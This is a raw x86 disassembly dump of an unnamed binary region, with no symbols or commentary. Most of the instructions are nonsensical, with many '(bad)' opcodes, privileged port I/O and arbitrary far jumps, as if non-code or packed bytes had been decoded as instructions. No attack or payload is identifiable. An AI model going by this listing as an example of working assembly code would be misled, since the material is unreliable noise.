  406bc5:	lods   al,BYTE PTR ds:[esi]
  406bc6:	adc    edi,DWORD PTR [ebx-0x1a6cec97]
  406bcc:	(bad)  
  406bcd:	daa    
  406bce:	int3   
  406bcf:	adc    esi,DWORD PTR [ebp+0x23dfd98a]
  406bd5:	xchg   esi,eax
  406bd6:	stos   DWORD PTR es:[edi],eax
  406bd7:	ins    DWORD PTR es:[edi],dx
  406bd8:	repnz sub eax,0x4961001e
  406bde:	rol    BYTE PTR [esi],1
  406be0:	outs   dx,BYTE PTR ds:[esi]
  406be1:	mov    esi,0x6ba172be
  406be6:	mov    es,WORD PTR [esi-0x597ddc29]
  406bec:	(bad)  
  406bed:	cmp    eax,0xb299de41
  406bf2:	cli    
  406bf3:	lahf   
  406bf4:	adc    al,0xf4
  406bf6:	lock jne 0x406b7e
  406bf9:	xor    al,0xf3
  406bfb:	leave  
  406bfc:	popa   
  406bfd:	mov    bl,BYTE PTR [ebx]
  406bff:	and    eax,0x9df6f50b
  406c04:	cmp    DWORD PTR [ebp-0x3f6c9e48],esi
  406c0a:	push   0x535ac176
  406c0f:	jns    0x406c43
  406c11:	xor    al,0x99
  406c13:	mov    ebx,0x1bbae144
  406c18:	dec    eax
  406c19:	or     al,0x3f
  406c1b:	(bad)  
  406c1c:	pop    eax
  406c1d:	pop    ds
  406c1e:	xchg   ebx,eax
  406c1f:	es add cl,dl
  406c22:	cmp    esp,DWORD PTR [ebx+0x53560993]
  406c28:	fstp   TBYTE PTR [edx+ecx*2]
  406c2b:	adc    ebp,DWORD PTR [edi]
  406c2d:	call   0xad5b:0x25d1bcf9
  406c34:	jge    0x406c2a
  406c36:	pop    eax
  406c37:	inc    esi
  406c38:	pop    ebp
  406c39:	or     al,0x3b
  406c3b:	jmp    0x6706fe35
  406c40:	add    DWORD PTR [edx],ebx
  406c42:	in     al,0x28
  406c44:	retf   0xd691
  406c47:	daa    
  406c48:	push   ss
  406c49:	ss aam 0x26
  406c4c:	sahf   
  406c4d:	pop    edx
  406c4e:	mov    dh,0x91
  406c50:	(bad)  
  406c51:	stos   BYTE PTR es:[edi],al
  406c52:	or     bh,BYTE PTR [eax-0x4e]
  406c55:	pop    ss
  406c56:	sub    DWORD PTR [ecx+0x6788ca80],esp
  406c5c:	xchg   ecx,eax
  406c5d:	xchg   ebp,eax
  406c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c5f:	jecxz  0x406cd5
  406c61:	add    BYTE PTR [edi],bl
  406c63:	mov    bl,0x26
  406c65:	add    cl,dh
  406c67:	jae    0x406c9b
  406c69:	jmp    0x406c57
  406c6b:	lahf   
  406c6c:	fisttp DWORD PTR [esp+esi*1-0x5d63ed28]
  406c73:	add    dl,BYTE PTR [ecx]
  406c75:	scas   eax,DWORD PTR es:[edi]
  406c76:	popa   
  406c77:	mov    edi,0xd42bdcc2
  406c7c:	jecxz  0x406cb9
  406c7e:	push   cs
  406c7f:	sub    eax,0xc6560be9
  406c84:	outs   dx,DWORD PTR ds:[esi]
  406c85:	pop    ecx
  406c86:	push   edx
  406c87:	inc    esp
  406c88:	clc    
  406c89:	add    DWORD PTR [ebp+0x6],0xffffffdb
  406c8d:	xchg   ecx,eax
  406c8e:	push   cs
  406c8f:	and    eax,edx
  406c91:	xor    esi,DWORD PTR [ebx-0x28]
  406c94:	jb     0x406c53
  406c96:	inc    edx
  406c97:	mov    esp,0xaa782677
  406c9c:	sub    ah,dl
  406c9e:	dec    eax
  406c9f:	or     ebp,DWORD PTR [eax+0x233fbec9]
  406ca5:	jb     0x406c97
  406ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ca8:	pop    es
  406ca9:	and    BYTE PTR [ecx-0x10be1dc0],bh
  406caf:	dec    ebx
  406cb0:	jmp    0x5ffbf041
  406cb5:	push   ebx
  406cb6:	ins    DWORD PTR es:[edi],dx
  406cb7:	retf   0x6c36
  406cba:	in     eax,dx
  406cbb:	cli    
  406cbc:	jae    0x406d32
  406cbe:	scas   al,BYTE PTR es:[edi]
  406cbf:	js     0x406ce4
  406cc1:	shl    DWORD PTR [edi+eiz*1+0x25fc85ca],0x5c
  406cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cca:	jp     0x406cc7
  406ccc:	retf   0x43ce
  406ccf:	mov    esi,DWORD PTR [edx-0x22]
  406cd2:	and    eax,0x9ac5e834
  406cd7:	stos   BYTE PTR es:[edi],al
  406cd8:	outs   dx,BYTE PTR ds:[esi]
  406cd9:	sbb    DWORD PTR ss:[edi-0x59b39f2c],0xa5d6a990
  406ce4:	fmul   DWORD PTR [eax+0x4a]
  406ce7:	sti    
  406ce8:	pop    ecx
  406ce9:	nop
  406cea:	inc    ecx
  406ceb:	in     eax,dx
  406cec:	jl     0x406d1d
  406cee:	adc    BYTE PTR [esi],0x9b
  406cf1:	xchg   edi,esi
  406cf3:	mov    DWORD PTR ss:[edx+0x65cb5ce6],ebp
  406cfa:	xchg   edi,eax
  406cfb:	cld    
  406cfc:	lods   eax,DWORD PTR ds:[esi]
  406cfe:	xlat   BYTE PTR ds:[ebx]
  406cff:	xor    al,BYTE PTR [eax-0x1e]
  406d02:	or     eax,DWORD PTR [ecx-0x33]
  406d05:	push   edx
  406d06:	mov    eax,ds:0x6f6f64fd
  406d0b:	mov    ecx,0x61908b25
  406d10:	add    al,0xdf
  406d12:	test   eax,0x71a51327
  406d17:	inc    ebx
  406d18:	xor    al,0xab
  406d1a:	pop    es
  406d1b:	scas   al,BYTE PTR es:[edi]
  406d1c:	sbb    DWORD PTR [ebx-0x39d5049d],ecx
  406d22:	jae    0x406d47
  406d24:	or     BYTE PTR [esi],al
  406d26:	push   ebp
  406d27:	push   cs
  406d28:	imul   edx,ecx,0x9ea48a62
  406d2e:	pop    edx
  406d2f:	test   DWORD PTR [eax+edi*1-0x4e],eax
  406d33:	addr16 dec eax
  406d35:	test   DWORD PTR [ecx-0x77],esp
  406d38:	dec    esp
  406d39:	dec    esp
  406d3a:	data16 in al,dx
  406d3c:	jmp    FWORD PTR [edi-0x3d]
  406d3f:	aad    0xb3
  406d41:	hlt    
  406d42:	pop    ss
  406d43:	jns    0x406d96
  406d45:	add    dh,dl
  406d47:	sub    dh,BYTE PTR ds:0x8255990a
  406d4d:	pop    ss
  406d4e:	push   ebx
  406d4f:	sub    BYTE PTR [esi+0x4c],bh
  406d52:	shl    DWORD PTR [edx],0x87
  406d55:	imul   bl
  406d57:	xchg   ebp,eax
  406d58:	jmp    0x3d8d0def
  406d5d:	outs   dx,DWORD PTR ds:[esi]
  406d5e:	push   es
  406d5f:	and    BYTE PTR [ebx],0xd4
  406d62:	add    bh,BYTE PTR [ecx]
  406d64:	pop    ss
  406d65:	push   ds
  406d66:	adc    eax,DWORD PTR [edx+ebx*2+0x24]
  406d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d6b:	add    DWORD PTR [bp-0x68c],edi
  406d70:	push   0xfffffff6
  406d72:	add    eax,0x7201ab88
  406d77:	lea    edx,[ebp-0x49]
  406d7a:	cwde   
  406d7b:	hlt    
  406d7c:	and    BYTE PTR [edi+0x2d80e282],0x8e
  406d83:	push   0xffffffd7
  406d85:	jnp    0x406d51
  406d87:	cli    
  406d88:	les    esi,FWORD PTR [edi-0x41]
  406d8b:	pop    edi
  406d8c:	adc    edi,DWORD PTR [ecx-0x1ae68084]
  406d92:	push   ds
  406d93:	mov    eax,ds:0xe626f020
  406d98:	test   al,0xf3
  406d9a:	ss cmp ebp,ebp
  406d9d:	scas   eax,DWORD PTR es:[edi]
  406d9e:	rcr    BYTE PTR [esi-0x4a],1
  406da1:	dec    edx
  406da2:	shr    BYTE PTR [eax-0x1d8f5eff],0x19
  406da9:	mov    ebp,0x8b3da0a4
  406dae:	fxtract 
  406db0:	mov    eax,ds
  406db2:	fcom   st(0)
  406db4:	cmp    DWORD PTR [edx],esi
  406db6:	xor    edx,esi
  406db8:	xor    bh,ch
  406dba:	inc    edx
  406dbb:	or     eax,DWORD PTR [eax+eax*1-0x54]
  406dbf:	adc    DWORD PTR [edi],0xefe8fca6
  406dc5:	pop    ebp
  406dc6:	pop    ebp
  406dc7:	dec    edx
  406dc8:	cmp    ebp,esi
  406dca:	mov    bl,0xb7
  406dcc:	adc    al,0xad
  406dce:	popa   
  406dcf:	pop    edx
  406dd0:	jo     0x406d57
  406dd2:	push   eax
  406dd3:	ret    0xd2ad
  406dd6:	jbe    0x406dad
  406dd8:	inc    eax
  406dd9:	(bad)  
  406dda:	out    dx,al
  406ddb:	mov    ecx,0x5227eaf
  406de0:	add    ebp,DWORD PTR [eax+0x2c7f2dea]
  406de6:	imul   ebx,DWORD PTR [eax+0x4c9ce4d8],0x87831f59
  406df0:	dec    edi
  406df1:	daa    
  406df2:	xor    ebx,DWORD PTR [si-0x5e]
  406df6:	int3   
  406df7:	inc    esp
  406df8:	enter  0x8623,0xd
  406dfc:	imul   ebp,DWORD PTR [ecx+0x44],0x4e8edd04
  406e03:	or     BYTE PTR [ebx+0x45],0xe6
  406e07:	iret   
  406e08:	mov    ah,0xcd
  406e0a:	clc    
  406e0b:	pop    ds
  406e0c:	iret   
  406e0d:	jmp    0x44ac:0xf6325265
  406e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e15:	je     0x406e3d
  406e17:	std    
  406e18:	std    
  406e19:	mov    ebp,0x79aed205
  406e1e:	inc    edx
  406e1f:	(bad)  
  406e20:	mov    DWORD PTR [esi+0xe],ebp
  406e23:	rcr    BYTE PTR [edi],1
  406e25:	neg    BYTE PTR [ebx+ebp*1+0x3c3eae98]
  406e2c:	jne    0x406e1e
  406e2e:	cdq    
  406e2f:	adc    al,0x8
  406e31:	aas    
  406e32:	push   cs
  406e33:	xor    BYTE PTR [ebp+0x987d2d6],bh
  406e39:	xchg   ebx,eax
  406e3a:	pop    ebp
  406e3b:	jecxz  0x406e49
  406e3d:	adc    al,0x9c
  406e3f:	js     0x406e19
  406e41:	pop    ecx
  406e42:	xchg   edi,eax
  406e43:	xor    al,0x1d
  406e45:	loopne 0x406e13
  406e47:	mov    bl,0x2e
  406e49:	pop    ebp
  406e4a:	adc    eax,0xbc3540e0
  406e4f:	sub    eax,0x6beaee02
  406e54:	in     eax,dx
  406e55:	aaa    
  406e56:	xor    DWORD PTR [edi],ebx
  406e58:	pop    ecx
  406e59:	idiv   BYTE PTR [ecx-0x3f]
  406e5c:	inc    eax
  406e5d:	fwait
  406e5e:	push   eax
  406e5f:	sahf   
  406e60:	and    eax,0xa2458752
  406e65:	push   0x46
  406e67:	lods   al,BYTE PTR ds:[esi]
  406e68:	cwde   
  406e69:	in     al,dx
  406e6a:	retf   0x5cdd
  406e6d:	retf   0x5c10
  406e70:	jno    0x406e9b
  406e72:	imul   edi,DWORD PTR [ebx+0x60a23853],0x8bfccd32
  406e7c:	push   ss
  406e7d:	or     cl,BYTE PTR [ebx+0x5d9c49f3]
  406e83:	shr    BYTE PTR [edi],0xa4
  406e86:	pop    eax
  406e87:	nop
  406e88:	xlat   BYTE PTR ds:[ebx]
  406e89:	mov    fs,WORD PTR [edx-0xecced64]
  406e8f:	sbb    bh,cl
  406e91:	xchg   esp,eax
  406e92:	cmp    ebp,edx
  406e94:	and    DWORD PTR [eax],esi
  406e96:	ins    DWORD PTR es:[edi],dx
  406e97:	cdq    
  406e98:	mov    ds:0x5f4ffd2c,al
  406e9d:	int    0xaa
  406e9f:	jne    0x406e71
  406ea1:	mov    ds:0xef6f4a2a,al
  406ea6:	lahf   
  406ea7:	and    DWORD PTR [edi+0x79],edi
  406eaa:	sti    
  406eab:	mov    cl,0xe0
  406ead:	js     0x406e98
  406eaf:	push   ebp
  406eb0:	jmp    0x406e7e
  406eb2:	xchg   esp,ecx
  406eb4:	xchg   ebp,eax
  406eb5:	stos   DWORD PTR es:[edi],eax
  406eb6:	popa   
  406eb7:	pop    es
  406eb8:	std    
  406eb9:	mov    ecx,0x18b053e6
  406ebe:	mov    al,0xa5
  406ec0:	xchg   edi,eax
  406ec1:	xchg   DWORD PTR [edi-0x13],edi
  406ec4:	addr16 push ebx
  406ec6:	(bad)  
  406ec7:	call   DWORD PTR [eax-0x6e]
  406eca:	enter  0x19ca,0x26
  406ece:	or     DWORD PTR [eax],esp
  406ed0:	out    0x4a,eax
  406ed2:	sahf   
  406ed3:	or     ch,bl
  406ed5:	add    eax,0x92e3b48d
  406eda:	ss (bad) 
  406edc:	jg     0x406eec
  406ede:	cld    
  406edf:	fist   WORD PTR [esp+ebx*8+0x117f739e]
  406ee6:	mov    ebx,0x51ee0148
  406eeb:	mov    ecx,0x68d49bf8
  406ef0:	rcl    DWORD PTR [ebx-0x98d1a7c],1
  406ef6:	test   eax,0xc6c430f7
  406efb:	lahf   
  406efc:	pushf  
  406efd:	and    DWORD PTR [ebx+0x10],0x6e454b51
  406f04:	xchg   DWORD PTR [eax+0x49],eax
  406f07:	add    al,0xd2
  406f09:	lods   al,BYTE PTR ds:[esi]
  406f0a:	pop    es
  406f0b:	xor    DWORD PTR [eax+0x1ad74eff],ebp
  406f11:	add    esp,ecx
  406f13:	or     BYTE PTR [ecx-0x4273529a],ah
  406f19:	sub    edi,ebp
  406f1b:	mov    bh,BYTE PTR [edx+0x43978b49]
  406f21:	pop    ebp
  406f22:	cs js  0x406f46
  406f25:	sub    al,BYTE PTR [esi+0x24]
  406f28:	js     0x406ec4
  406f2a:	out    dx,al
  406f2b:	fstp   DWORD PTR [ebx+0x7c933b99]
  406f31:	fs inc ebx
  406f33:	mov    ebp,DWORD PTR [ecx+ebx*4+0x5f]
  406f37:	mov    bl,0xe9
  406f39:	leave  
  406f3a:	mov    esi,0xdbc32906
  406f3f:	xchg   ah,cl
  406f41:	sbb    eax,0x8610543f
  406f46:	stc    
  406f47:	shl    DWORD PTR [edi-0x4c2637c5],0x98
  406f4e:	xchg   esi,eax
  406f4f:	test   BYTE PTR [ebp-0x2b],0x4d
  406f53:	sbb    eax,0xfbbe62e1
  406f58:	and    esp,edx
  406f5a:	mov    dh,0x9a
  406f5c:	sahf   
  406f5d:	aas    
  406f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f5f:	imul   ch
  406f61:	les    edi,FWORD PTR [esi+0xe]
  406f64:	push   esi
  406f65:	repz int3 
  406f67:	cmp    eax,0x1b74c6d9
  406f6c:	xchg   edi,eax
  406f6d:	div    BYTE PTR [eax+0x33]
  406f70:	cmp    bl,ch
  406f72:	(bad)  
  406f73:	and    eax,0x83dbc4d6
  406f78:	mov    dh,0xf
  406f7a:	adc    edx,ebx
  406f7c:	ret    0xbabd
  406f7f:	push   edi
  406f80:	popf   
  406f81:	push   edi
  406f82:	add    dl,0x81
  406f85:	inc    edi
  406f86:	sbb    al,0xd2
  406f88:	pop    eax
  406f89:	ja     0x406f2a
  406f8b:	cmp    edx,esp
  406f8d:	scas   al,BYTE PTR es:[edi]
  406f8e:	push   eax
  406f8f:	jb     0x406f26
  406f91:	push   ds
  406f92:	(bad)  
  406f93:	dec    edi
  406f94:	aaa    
  406f95:	int3   
  406f96:	jae    0x407002
  406f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f99:	test   eax,0x1ad544db
  406f9e:	test   eax,0x59c2d862
  406fa3:	adc    ecx,esi
  406fa5:	inc    ebx
  406fa6:	mov    edi,0x2f3ddc7e
  406fab:	lods   eax,DWORD PTR ds:[esi]
  406fac:	loop   0x407017
  406fae:	push   edi
  406faf:	out    0xb4,al
  406fb1:	and    ebx,ecx
  406fb3:	dec    BYTE PTR [eax+0x766aa6a7]
  406fb9:	ror    BYTE PTR [esi+0x10234409],0x2
  406fc0:	pop    ebx
  406fc1:	outs   dx,BYTE PTR ds:[esi]
  406fc2:	int    0xd9
  406fc4:	stos   BYTE PTR es:[edi],al
  406fc5:	pop    esp
  406fc6:	inc    edi
  406fc7:	(bad)  
  406fc8:	(bad)  
  406fc9:	popf   
  406fca:	cdq    
  406fcb:	or     eax,0x62d809b5
  406fd0:	leave  
  406fd1:	loop   0x406f97
  406fd3:	loope  0x407015
  406fd5:	dec    esp
  406fd6:	test   al,0xf7
  406fd8:	popf   
  406fd9:	cdq    
  406fda:	mov    al,0x2a
  406fdc:	aam    0x0
  406fde:	inc    esi
  406fdf:	xchg   esp,esp
  406fe1:	enter  0xce08,0x69
  406fe5:	ins    DWORD PTR es:[edi],dx
  406fe6:	loope  0x406fe5
  406fe8:	sbb    al,0x43
  406fea:	fadd   QWORD PTR ds:0x874222e
  406ff0:	dec    ebp
  406ff1:	popf   
  406ff2:	inc    ecx
  406ff3:	or     cl,BYTE PTR [edi-0x55]
  406ff6:	lods   al,BYTE PTR ds:[esi]
  406ff7:	sahf   
  406ff8:	test   BYTE PTR [esi-0x71],dh
  406ffb:	cli    
  406ffc:	jb     0x406fa0
  406ffe:	inc    edx
  406fff:	push   ebx
  407000:	js     0x406fb6
  407002:	outs   dx,DWORD PTR ds:[esi]
  407003:	inc    esp
  407004:	in     al,dx
  407005:	in     eax,dx
  407006:	arpl   WORD PTR [edx+0x2c],si
  407009:	xchg   esp,eax
  40700a:	pop    edx
  40700b:	xor    al,0x53
  40700d:	jno    0x40705f
  40700f:	inc    ebp
  407010:	sbb    dh,BYTE PTR [edx]
  407012:	ins    BYTE PTR es:[edi],dx
  407013:	sti    
  407014:	cmp    al,0xf9
  407016:	(bad)  
  407017:	out    0x5,eax
  407019:	push   edx
  40701a:	(bad)  [eax]
  40701c:	loope  0x40709c
  40701e:	dec    edi
  40701f:	data16 (bad) 
  407021:	das    
  407022:	retf   0x34c8
  407025:	push   ss
  407026:	retf   0x9e7b
  407029:	inc    esi
  40702a:	sub    eax,0xdfd39b43
  40702f:	rol    DWORD PTR [ebp+0x6a],cl
  407032:	aam    0x58
  407034:	sbb    eax,esp
  407036:	mov    ebx,0x7de6910
  40703b:	lea    esi,[eax+edi*8+0x1c41a7c0]
  407042:	add    esp,DWORD PTR [eax-0x2b]
  407045:	mov    ds:0xd222360b,eax
  40704a:	mov    BYTE PTR [eax+0x6],dh
  40704d:	mov    al,bh
  40704f:	cmp    DWORD PTR [ebx],eax
  407051:	loop   0x407092
  407053:	sub    esi,DWORD PTR [ebx]
  407055:	or     bl,BYTE PTR [ecx-0x18d8948b]
  40705b:	and    dl,BYTE PTR [ecx]
  40705d:	imul   edx,DWORD PTR [edi+esi*8+0x3f],0x29f5e393
  407065:	je     0x4070cf
  407067:	shl    DWORD PTR [ebx+0x70c0543],1
  40706d:	cld    
  40706e:	scas   eax,DWORD PTR es:[edi]
  40706f:	ret    
  407070:	inc    edx
  407071:	repnz iret 
  407073:	inc    esp
  407074:	das    
  407075:	mov    dh,0x8d
  407077:	xchg   ebp,eax
  407078:	sbb    DWORD PTR [ecx],ebx
  40707a:	jecxz  0x407021
  40707c:	stos   DWORD PTR es:[edi],eax
  40707d:	dec    eax
  40707e:	sub    DWORD PTR [eax],eax
  407080:	xchg   esp,eax
  407081:	out    0x32,al
  407083:	and    bh,BYTE PTR [ebp+0x10]
  407086:	and    dh,BYTE PTR [edi+0x189f6de0]
  40708c:	loopne 0x407033
  40708e:	fwait
  40708f:	test   ecx,ebp
  407091:	or     BYTE PTR [esi],dh
  407093:	xchg   DWORD PTR [edx],ebp
  407095:	loop   0x407114
  407097:	out    0xb6,eax
  407099:	clc    
  40709a:	retf   
  40709b:	pusha  
  40709c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40709d:	jmp    0x40710c
  40709f:	clc    
  4070a0:	fs std 
  4070a2:	dec    esp
  4070a3:	jle    0x407074
  4070a5:	sbb    ah,dh
  4070a7:	xchg   esp,eax
  4070a8:	lds    esp,FWORD PTR [edi-0x66a23226]
  4070ae:	outs   dx,BYTE PTR ds:[esi]
  4070af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b0:	stc    
  4070b1:	push   ebx
  4070b2:	sahf   
  4070b3:	retf   0xf38
  4070b6:	jecxz  0x407120
  4070b8:	std    
  4070b9:	(bad)  
  4070ba:	mov    eax,ds:0x95849f25
  4070bf:	push   cs
  4070c0:	pop    eax
  4070c1:	ins    DWORD PTR es:[edi],dx
  4070c2:	ds mov ebx,0x584adcb0
  4070c8:	xor    eax,0xb5feafb9
  4070cd:	ficom  DWORD PTR [edx+0x23]
  4070d0:	or     al,0x4
  4070d2:	xchg   ebp,eax
  4070d3:	sub    al,0xc4
  4070d5:	test   DWORD PTR [edi+0x5a],ebx
  4070d8:	add    cl,BYTE PTR [esi]
  4070da:	jns    0x407085
  4070dc:	cmp    ebp,ebx
  4070de:	mov    al,0xe7
  4070e0:	jecxz  0x40713c
  4070e2:	or     DWORD PTR [eax],ebp
  4070e4:	jo     0x4070aa
  4070e6:	in     eax,dx
  4070e7:	jae    0x407095
  4070e9:	loope  0x4070cf
  4070eb:	mov    WORD PTR [edx+ebp*8+0x55edb031],cs
  4070f2:	aad    0x43
  4070f4:	or     al,0xd2
  4070f6:	(bad)  
  4070f8:	leave  
  4070f9:	pop    edi
  4070fa:	jle    0x4070d8
  4070fc:	adc    edx,DWORD PTR [edx+eiz*2+0x5425ef56]
  407103:	rcl    BYTE PTR [ebx+0x5],cl
  407106:	sub    DWORD PTR [esi+0x3c],ebx
  407109:	sub    ecx,DWORD PTR [eax]
  40710b:	mov    edx,0xdd5efc05
  407110:	and    eax,0xd5593790
  407115:	addr16 jbe 0x407170
  407118:	and    BYTE PTR [ebp-0x74],ch
  40711b:	mov    ebx,0xa3718c23
  407120:	xchg   edx,eax
  407121:	mov    ch,0xd2
  407123:	pop    edx
  407124:	leave  
  407125:	ds adc al,0x14
  407128:	mov    al,0x31
  40712a:	pusha  
  40712b:	push   ebp
  40712c:	data16 jne 0x407193
  40712f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407130:	outs   dx,BYTE PTR ds:[esi]
  407131:	inc    edi
  407132:	dec    eax
  407133:	aas    
  407134:	arpl   WORD PTR [edx-0x5d],sp
  407137:	(bad)  [eax]
  407139:	fwait
  40713a:	and    DWORD PTR [ebx+eax*2],0x49
  40713e:	cmp    eax,0xfffffff7
  407141:	mov    esi,0x309b69f8
  407146:	mov    eax,ds:0xfb79ab5f
  40714b:	cmp    BYTE PTR [esi],0x50
  40714e:	mov    esp,ebp
  407150:	ja     0x40711c
  407152:	push   ss
  407153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407154:	mov    ds:0x3246d183,al
  407159:	retf   
  40715a:	lds    edx,FWORD PTR [ebx]
  40715c:	or     esp,DWORD PTR [ecx-0x16ed0718]
  407162:	adc    cl,BYTE PTR [edi]
  407164:	dec    edi
  407165:	dec    ecx
  407166:	add    BYTE PTR [edi],0x32
  407169:	jne    0x407199
  40716b:	jmp    0x41c3:0x59a2c2b7
  407172:	(bad)  
  407173:	bound  esi,QWORD PTR [ebx]
  407175:	js     0x407145
  407177:	push   ecx
  407178:	fnstenv [ebx-0x79]
  40717b:	xlat   BYTE PTR ds:[ebx]
  40717c:	(bad)  
  40717d:	pop    eax
  40717e:	enter  0x241,0x4a
  407182:	push   esp
  407183:	xor    DWORD PTR [ebx],eax
  407185:	sbb    BYTE PTR [ebx-0x735726cb],0x79
  40718c:	sbb    bh,bl
  40718e:	call   0x28b0:0x230bb6be
  407195:	int3   
  407196:	sub    ah,cl
  407198:	pop    ds
  407199:	fdiv   st(0),st
  40719b:	loopne 0x407161
  40719d:	inc    eax
  40719e:	jmp    0x407125
  4071a0:	clc    
  4071a1:	data16 mov ch,0x1c
  4071a4:	mov    ds:0xab23e305,al
  4071a9:	xor    DWORD PTR [ebp+0x3c],ebp
  4071ac:	enter  0x590b,0xea
  4071b0:	and    BYTE PTR [esi+0x6e],0x20
  4071b4:	imul   esp,DWORD PTR [ebx-0x37f6d988],0xffffffb1
  4071bb:	dec    esp
  4071bc:	xor    edx,DWORD PTR [ebx-0x2b]
  4071bf:	(bad)  
  4071c1:	xor    eax,0x1f5a6c63
  4071c6:	into   
  4071c7:	icebp  
  4071c8:	push   edi
  4071c9:	inc    ebx
  4071ca:	push   esi
  4071cb:	xchg   edx,eax
  4071cc:	ja     0x4071c0
  4071ce:	sti    
  4071cf:	mov    ah,0x39
  4071d1:	aad    0x7f
  4071d3:	sahf   
  4071d4:	call   0x2ac7db59
  4071d9:	jns    0x40718c
  4071db:	cmp    edi,DWORD PTR [edx-0x5a]
  4071de:	dec    esp
  4071df:	(bad)  
  4071e1:	fisub  WORD PTR [edi]
  4071e3:	clc    
  4071e4:	retf   0xe0bb
  4071e7:	(bad)  
  4071e8:	adc    cl,BYTE PTR [edi+0x247a8109]
  4071ee:	icebp  
  4071ef:	leave  
  4071f0:	xor    al,BYTE PTR [esi]
  4071f2:	and    ecx,edx
  4071f4:	adc    ch,BYTE PTR [ebx]
  4071f6:	adc    esp,esi
  4071f8:	gs ins BYTE PTR es:[edi],dx
  4071fa:	mov    dh,0x21
  4071fc:	inc    esi
  4071fd:	mov    ebp,0xdec720ba
  407202:	loopne 0x407217
  407204:	gs (bad) 
  407207:	sub    ebp,esp
  407209:	xor    BYTE PTR [ebx-0xf],dh
  40720c:	repnz adc esi,edx
  40720f:	sar    DWORD PTR [ecx+ebp*2+0x62],cl
  407213:	(bad)  
  407215:	rcl    esi,cl
  407217:	inc    edx
  407218:	pop    ebp
  407219:	jle    0x407295
  40721b:	dec    ecx
  40721c:	jmp    0x407280
  40721e:	cmp    DWORD PTR [esi+0x32ab0f14],0x6a
  407225:	rol    BYTE PTR [eax+0x15694b6],0xc7
  40722c:	xor    BYTE PTR [ebp+0x7b],ah
  40722f:	pusha  
  407230:	and    DWORD PTR [edi],ebx
  407232:	mov    ?,WORD PTR [esi+0x63]
  407235:	test   eax,0x48bf4403
  40723a:	cmp    BYTE PTR [ecx],al
  40723c:	jae    0x407231
  40723e:	mov    ecx,0xc1e5639a
  407243:	sub    DWORD PTR [edi+edi*4],0xfca34dba
  40724a:	imul   ebp,DWORD PTR [ecx-0x7efa269b],0xffffff9d
  407251:	je     0x40729d
  407253:	push   eax
  407254:	xor    DWORD PTR [edx-0x10],edx
  407257:	push   ss
  407258:	and    DWORD PTR [ebp+0xe],0xbe4345e9
  40725f:	push   cs
  407260:	ror    ah,1
  407262:	(bad)  
  407263:	fild   WORD PTR [ecx+0x27986ac8]
  407269:	cmc    
  40726a:	sbb    al,BYTE PTR [eax]
  40726c:	sar    ah,1
  40726e:	div    dl
  407270:	push   es
  407271:	rcr    BYTE PTR [edi+0x6c3ca34d],0x71
  407278:	sbb    DWORD PTR ds:0x3dd82b63,esi
  40727e:	imul   ebp,DWORD PTR [ecx],0xffffffae
  407281:	push   eax
  407282:	add    BYTE PTR [edx],cl
  407284:	sub    bl,ch
  407286:	mov    bl,0x6b
  407288:	adc    ch,0x35
  40728b:	mov    al,ds:0x2bbd0a90
  407290:	lock dec ebx
  407292:	shl    BYTE PTR [ebx],cl
  407294:	fs jne 0x407223
  407297:	loopne 0x40726a
  407299:	inc    eax
  40729a:	in     eax,0x49
  40729c:	loopne 0x4072cf
  40729e:	pop    ebp
  40729f:	add    al,0x75
  4072a1:	inc    ebp
  4072a2:	(bad)  
  4072a3:	in     eax,0x80
  4072a5:	sbb    eax,0x77f3752c
  4072aa:	fisttp QWORD PTR [ecx-0x71]
  4072ad:	imul   ecx,DWORD PTR [esi],0xffffffbc
  4072b0:	and    dx,WORD PTR [edx-0x68]
  4072b4:	push   0x70a04fcd
  4072b9:	sbb    eax,0x3ce42c8e
  4072be:	mov    bh,0xd9
  4072c0:	inc    edi
  4072c1:	push   cs
  4072c2:	int    0x2f
  4072c4:	cli    
  4072c5:	mov    bl,0x20
  4072c7:	xor    eax,0x8b2c23f4
  4072cc:	lahf   
  4072cd:	mov    eax,0xa2a99d26
  4072d2:	test   eax,0xd1ed4bfb
  4072d7:	fwait
  4072d8:	push   0xffffff9d
  4072da:	cmp    al,0xb1
  4072dc:	test   BYTE PTR [edi],bl
  4072de:	xor    al,0x5a
  4072e0:	push   eax
  4072e1:	dec    ebp
  4072e2:	rcr    edx,1
  4072e4:	cmp    eax,0xc6c464f
  4072e9:	sub    BYTE PTR [edx+0x20],0xe6
  4072ed:	(bad)
  4072f1:	stc    
  4072f2:	mov    dl,0x70
  4072f4:	inc    ecx
  4072f5:	sub    edi,esp
  4072f7:	lea    edi,[edx]
  4072f9:	adc    al,0xdb
  4072fb:	xlat   BYTE PTR ds:[ebx]
  4072fc:	xlat   BYTE PTR ds:[ebx]
  4072fd:	pop    ss
  4072fe:	dec    ebx
  4072ff:	loopne 0x4072c7
  407301:	mov    esi,0xa03b542c
  407306:	xchg   edx,eax
  407307:	pop    es
  407308:	lods   al,BYTE PTR ds:[esi]
  407309:	sbb    BYTE PTR [eax+0x21212e40],bl
  40730f:	jp     0x407305
  407311:	lea    eax,[edx-0x491afd6b]
  407317:	into   
  407318:	(bad)  
  407319:	(bad)  
  40731b:	xchg   edi,eax
  40731c:	jg     0x4072f1
  40731e:	jno    0x407379
  407320:	xchg   esi,eax
  407321:	mov    dh,0xad
  407323:	dec    edi
  407324:	mov    ecx,0xda0693cf
  407329:	ins    BYTE PTR es:[edi],dx
  40732a:	dec    edi
  40732b:	mov    edi,0x1419ad1e
  407330:	je     0x407347
  407332:	jmp    0xc88f:0xfc649eb4
  407339:	inc    ecx
  40733a:	push   eax
  40733b:	add    BYTE PTR [edi],al
  40733d:	jmp    0x440bc817
  407342:	xlat   BYTE PTR ds:[ebx]
  407343:	ror    esp,0x2e
  407346:	jle    0x4072d6
  407348:	mov    DWORD PTR [eax+0x0],ebp
  40734b:	pushf  
